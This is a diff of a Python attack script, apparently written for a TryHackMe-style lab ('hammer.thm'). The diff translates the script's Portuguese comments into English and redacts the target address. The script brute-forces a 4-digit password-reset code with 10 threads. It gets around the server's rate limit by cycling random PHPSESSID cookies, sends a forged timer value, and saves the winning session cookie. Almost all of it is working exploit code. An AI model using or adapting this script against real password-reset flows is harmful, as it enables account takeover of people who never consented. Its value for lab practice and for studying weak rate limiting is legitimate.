@@ -5,45 +5,45 @@ import string
 import sys
 import time
 
-# --- CONFIGURAÇÕES ---
-BASE_URL = "http://10.80.177.67:1337"
+# --- CONFIGURATION ---
+BASE_URL = "http://[IP]:[PORT]"
 ENDPOINT = "/reset_password.php"
 EMAIL = "tester@hammer.thm"
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/140.0",
     "Content-Type": "application/x-www-form-urlencoded"
 }
-THREADS = 10  # Ajuste conforme necessário
+THREADS = 10  # Adjust as necessary
 
-# Variável global para parar todas as threads quando a senha for encontrada
+# Global event to stop all threads when the code is found
 found_event = False
 
 def get_new_session():
-    """Cria uma sessão limpa e inicia o fluxo para resetar o contador do servidor"""
+    """Creates a fresh session and initializes the flow to reset the server's rate limit counter."""
     s = requests.Session()
-    # Gera um PHPSESSID aleatório
+    # Generate a random PHPSESSID to bypass the IP/Email check
     phpsessid = "hmr" + ''.join(random.choices(string.ascii_letters + string.digits, k=10))
     s.cookies.set("PHPSESSID", phpsessid)
     
     try:
-        # Passo 1: Iniciar o fluxo com o email
+        # Step 1: Initialize the password reset flow
         data = {"email": EMAIL}
         r = s.post(f"{BASE_URL}{ENDPOINT}", headers=HEADERS, data=data, allow_redirects=True)
         
-        # Leitura dinâmica do Rate Limit
+        # Dynamic Rate Limit reading from headers
         if "Rate-Limit-Pending" in r.headers:
             limit = int(r.headers["Rate-Limit-Pending"])
             return s, limit
         else:
-            # Fallback seguro se o header não existir
+            # Safe fallback if header is missing
             return s, 5 
-    except Exception as e:
+    except Exception:
         return None, 0
 
 def brute_force_worker(code_range):
     global found_event
     
-    # Cada thread inicia sua própria sessão
+    # Each thread manages its own session
     session, limit = get_new_session()
     
     for code in code_range:
@@ -52,14 +52,14 @@ def brute_force_worker(code_range):
 
         otp = f"{code:04d}"
         
-        # Se a sessão falhou na criação ou o limite está perigosamente baixo (1), renova.
+        # Renew session if creation failed or limit is critically low
         if session is None or limit <= 1:
             session, limit = get_new_session()
             if session is None:
-                continue # Tenta na próxima iteração se der erro de rede
+                continue 
 
-        # Dados do POST
-        # Nota: Usamos 170 para simular um tempo válido, mas não 180 (início)
+        # POST Data
+        # Note: 's' is the countdown timer. Sending 170 simulates a valid timeframe.
         data = {
             "recovery_code": otp,
             "s": "170" 
@@ -68,40 +68,39 @@ def brute_force_worker(code_range):
         try:
             r = session.post(f"{BASE_URL}{ENDPOINT}", headers=HEADERS, data=data)
             
-            # Atualiza o limite baseado na resposta do servidor
+            # Update limit based on server response (Source of Truth)
             if "Rate-Limit-Pending" in r.headers:
                 limit = int(r.headers["Rate-Limit-Pending"])
             else:
                 limit -= 1 
 
-            # --- VERIFICAÇÃO DE SUCESSO ---
-            # Se não tiver a mensagem de erro E não tiver pedindo o código de novo
+            # --- SUCCESS CHECK ---
+            # If the error message is gone and it's not asking for the code again
             if "Invalid or expired recovery code" not in r.text and "Enter Recovery Code" not in r.text:
                 found_event = True
                 
-                # Captura o ID da sessão vencedora
+                # Capture the winning session ID
                 winning_session = session.cookies.get("PHPSESSID")
                 
                 print(f"\n{'='*40}")
-                print(f"[+] SUCESSO! O código correto é: {otp}")
-                print(f"[+] SESSÃO VÁLIDA (PHPSESSID): {winning_session}")
+                print(f"[+] SUCCESS! Correct code: {otp}")
+                print(f"[+] VALID SESSION (PHPSESSID): {winning_session}")
                 print(f"{'='*40}\n")
                 
-                # Opcional: Salvar em arquivo para não perder
+                # Optional: Save to file for persistence
                 with open("flag_session.txt", "w") as f:
                     f.write(f"OTP: {otp}\nCookie: PHPSESSID={winning_session}")
                 return
 
-        except Exception as e:
-            # Erros de conexão silenciosos para não poluir o terminal, 
-            # mas decrementa o limite para forçar nova sessão
+        except Exception:
+            # Silent connection errors to avoid terminal clutter, force session renewal
             limit = 0 
 
 def start_attack():
-    print(f"[*] Alvo: {BASE_URL}")
-    print(f"[*] Iniciando ataque com {THREADS} threads...")
+    print(f"[*] Target: {BASE_URL}")
+    print(f"[*] Starting attack with {THREADS} threads...")
     
-    # Divide 0000 a 9999 entre as threads
+    # Split the 10,000 possibilities among threads
     total_codes = 10000
     chunk_size = total_codes // THREADS
     
@@ -110,7 +109,7 @@ def start_attack():
         for i in range(THREADS):
             start = i * chunk_size
             end = start + chunk_size
-            # O último chunk pega o resto se a divisão não for exata
+            # The last chunk takes the remainder to ensure full coverage
             if i == THREADS - 1:
                 end = 10000
             
